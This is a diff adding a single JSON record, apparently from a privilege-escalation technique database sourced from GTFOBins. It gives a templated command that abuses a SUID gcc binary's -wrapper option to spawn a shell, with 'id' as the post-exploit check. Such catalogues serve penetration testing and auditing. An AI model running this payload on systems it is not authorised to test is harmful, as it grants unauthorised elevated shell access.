@@ -1,0 +1,1 @@
+{"id":"suid_gcc","category":"SUID_GTFOBINS","binary":"gcc","cve":null,"exploitation":["{{binary}} -wrapper {{shell}},-s -v"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
